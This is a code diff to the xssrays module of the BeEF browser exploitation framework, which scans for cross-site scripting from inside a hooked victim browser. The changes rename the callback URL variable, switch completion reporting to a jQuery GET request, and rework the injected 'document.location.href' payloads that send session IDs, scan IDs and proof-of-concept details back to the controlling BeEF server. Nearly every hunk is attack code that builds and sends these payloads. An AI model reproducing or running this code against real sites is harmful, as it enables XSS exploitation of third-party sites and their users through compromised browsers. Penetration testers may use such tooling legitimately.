@@ -33,7 +33,6 @@
  * Other aspects of the original code have been simplified and improved.
  */
 beef.net.xssrays = {
-    // handler is needed when using beef.net.send
     handler: "xssrays",
     completed:0,
     totalConnections:0,
@@ -41,7 +40,7 @@ beef.net.xssrays = {
     // BeEF variables
     xssraysScanId : 0,
     hookedBrowserSession: "",
-    beefUrl: "",
+    beefRayUrl: "",
     // the 3 following variables are overridden via BeEF, in the Scan Config XssRays sub-tab. 
     crossDomain: false,
     debug:false,
@@ -110,7 +109,8 @@ beef.net.xssrays = {
 
         this.xssraysScanId = xssraysScanId;
         this.hookedBrowserSession = hookedBrowserSession;
-        this.beefUrl = beefUrl;
+        this.beefRayUrl = beefUrl + '/' + this.handler;
+        beef.net.xssrays.printDebug("Using [" + this.beefRayUrl  + "] handler to contact back BeEF");
         this.crossDomain = crossDomain;
         this.cleanUpTimeout = timeout;
         this.debug = debug;
@@ -120,11 +120,9 @@ beef.net.xssrays = {
         this.runJobs();
     },
     complete:function() {
-        beef.net.xssrays.printDebug("complete beef.net.xssrays.completed [" + beef.net.xssrays.completed
-            + "] - beef.net.xssrays.totalConnections [" + beef.net.xssrays.totalConnections + "]");
         if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
             beef.net.xssrays.printDebug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
-            beef.net.send('/xssrays', beef.net.xssrays.xssraysScanId, "");
+            $j.get(this.beefRayUrl, { hbsess: this.hookedBrowserSession, raysid: this.xssraysScanId, action: "finish"} );
         } else {
             this.getNextJob();
         }
@@ -138,9 +136,8 @@ beef.net.xssrays = {
                 that.completed++;
                 func.call(that);
             }
-        }else{ //nothing to scan
-           beef.net.xssrays.printDebug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
-           beef.net.send('/xssrays', beef.net.xssrays.xssraysScanId, "");
+        }else{ //nothing else to scan
+            this.complete();
         }
     },
     scan:function() {
@@ -326,8 +323,8 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                        beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
-                            + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";
+                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                            + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                         exploit = vector.input.replace(/XSS/g, beefCallback);
 
@@ -346,8 +343,8 @@ beef.net.xssrays = {
                 beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                 beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
-                    + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";
+                beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                    + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                 exploit = vector.input.replace(/XSS/g, beefCallback);
 
@@ -384,8 +381,8 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
-                        beefCallback = "document.location.href='" + this.beefUrl + "?hbsess=" + this.hookedBrowserSession + "&raysscanid=" + this.xssraysScanId
-                            + "&poc=" + ray.vector.poc + "&name=" + ray.vector.name + "&method=" + ray.vector.method + "'";
+                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
+                            + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                         exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                         form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
